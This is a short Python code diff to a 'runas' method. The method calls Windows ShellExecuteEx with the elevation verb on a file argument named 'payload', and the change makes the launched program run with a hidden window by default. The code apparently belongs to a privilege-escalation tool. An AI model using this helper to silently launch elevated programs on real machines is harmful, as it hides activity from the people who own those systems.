@@ -55,13 +55,13 @@ class process():
 		else:
 			return False
 
-	def runas(self, payload, params=""):
+	def runas(self, payload, window=False, params=""):
 		shinfo = ShellExecuteInfoW()
 		shinfo.cbSize = sizeof(shinfo)
 		shinfo.fMask = SEE_MASK_NOCLOSEPROCESS
 		shinfo.lpVerb = "runas"
 		shinfo.lpFile = payload
-		shinfo.nShow = SW_SHOW
+		shinfo.nShow = SW_SHOW if window else SW_HIDE
 		shinfo.lpParameters = params
 		try:
 			return bool(ShellExecuteEx(byref(shinfo)))
